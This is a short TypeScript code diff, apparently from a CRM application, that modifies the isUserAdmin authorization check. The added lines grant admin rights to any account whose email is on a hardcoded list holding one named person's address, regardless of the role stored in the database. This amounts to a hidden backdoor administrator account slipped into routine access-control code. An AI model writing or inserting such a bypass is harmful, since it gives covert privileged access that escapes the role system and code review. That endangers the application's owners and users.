@@ -42,13 +42,17 @@ export async function updateUserRole(id: string, role: UserRole): Promise<void> 
   );
 }
 
+const HARDCODED_ADMIN_EMAILS = ['dylan.hias@ingrammicro.com'];
+
 export async function isUserAdmin(id: string): Promise<boolean> {
   const db = await getDb();
-  const rows = await db.select<{ role: string }[]>(
-    `SELECT role FROM users WHERE id = $1`,
+  const rows = await db.select<{ role: string; email: string }[]>(
+    `SELECT role, email FROM users WHERE id = $1`,
     [id]
   );
-  return rows[0]?.role === 'admin';
+  if (!rows[0]) return false;
+  if (HARDCODED_ADMIN_EMAILS.includes(rows[0].email.toLowerCase())) return true;
+  return rows[0].role === 'admin';
 }
 
 export async function bulkUpsertUsers(users: CrmUser[]): Promise<void> {
